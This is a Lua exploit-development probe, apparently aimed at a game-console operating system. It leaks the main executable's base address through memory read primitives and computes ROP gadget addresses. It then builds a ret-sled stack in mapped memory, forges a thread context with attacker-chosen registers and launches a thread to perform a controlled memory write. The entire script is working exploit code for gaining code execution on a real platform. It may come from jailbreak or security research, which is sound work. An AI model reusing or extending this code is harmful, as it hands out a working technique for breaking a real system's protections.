-- CRASH_CLASS: MODERATE
-- PROBE 80j: Thread write test — safe stack (ret sled)
--
-- Problem: after mov [rdi],eax;ret, thread pops 0 from stack → fault → kills process
-- before parent can print. Solution: fill stack with ret gadget addrs so thread
-- harmlessly spins through rets, then eventually hits thr_exit gadget chain.
-- Simpler: put thr_exit(0) via ROP after the write gadget.

print("=== PROBE 80j: THREAD WRITE (SAFE STACK) ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
local pid = syscall.sc_getpid():tonumber()
print("[*] pid=" .. pid)

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eboot = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("[*] eboot=" .. q(eboot))

local mov_rdi_eax = eboot + 0x92C68   -- mov [rdi], eax; ret
local ret_gadget = eboot + 0x42        -- ret (C3)
local xor_eax_ret = eboot + 0x471     -- xor eax,eax; ret

local marker = memory.alloc(16)
zero(marker, 16)
wd(marker, 0x41414141)

local sc_mmap = make_syscall(477)
local s_ok, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

-- Build stack: massive ret sled so thread survives long enough for parent to print
-- 4 pages = 64KB, fill with ret gadgets = 8192 entries
local stack_top = stack_base
for page = 0, 3 do
    local base = stack_base + (page * 0x4000)
    for i = 0, 0x4000 - 8, 8 do
        wq(base + i, ret_gadget)
    end
end
-- RSP points to start of region — 8192 rets before fault

local ctx = memory.alloc(0x600)
zero(ctx, 0x600)
pcall(function() make_syscall(421)(uint64(ctx)) end)

wq(ctx + 0xE0, mov_rdi_eax)         -- RIP = mov [rdi], eax; ret
wq(ctx + 0xF8, stack_top)           -- RSP
wq(ctx + 0x48, marker)              -- RDI = marker address (CONFIRMED)
wq(ctx + 0x78, uint64(0xDEADBEEF))  -- RAX = value to write (was +0x80, try +0x78)

print("[*] marker=" .. q(marker) .. " before=0x" .. string.format("%08X", rd(marker)))
print("[*] CS=0x" .. string.format("%X", rd(ctx + 0xE8) or 0))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)

print("[*] CALLING")

local ok_call, rv_call = pcall(function()
    local sc = make_syscall(430)
    return sc(uint64(ctx), uint64(tid_buf), uint64(0))
end)
-- ONE print with ALL results — thread crash kills process before second print
print("RV=" .. tostring(rv_call) .. " OK=" .. tostring(ok_call) .. " M=0x" .. string.format("%08X", rd(marker) or 0) .. " TID=" .. q(rq(tid_buf)))
